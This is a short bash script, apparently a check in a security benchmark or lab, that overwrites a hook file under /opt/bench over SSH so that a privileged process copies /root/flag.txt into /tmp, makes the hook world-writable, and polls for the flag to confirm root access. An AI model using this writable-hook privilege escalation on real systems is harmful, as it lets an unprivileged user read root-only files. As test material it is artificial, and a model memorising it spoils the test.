#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/nginx_flag
cat > /opt/bench/nginx-hook.sh <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/nginx_flag
EOF
chmod 777 /opt/bench/nginx-hook.sh
for i in $(seq 1 45); do
  if test -r /tmp/nginx_flag && grep -q FLAG /tmp/nginx_flag 2>/dev/null; then
    cat /tmp/nginx_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
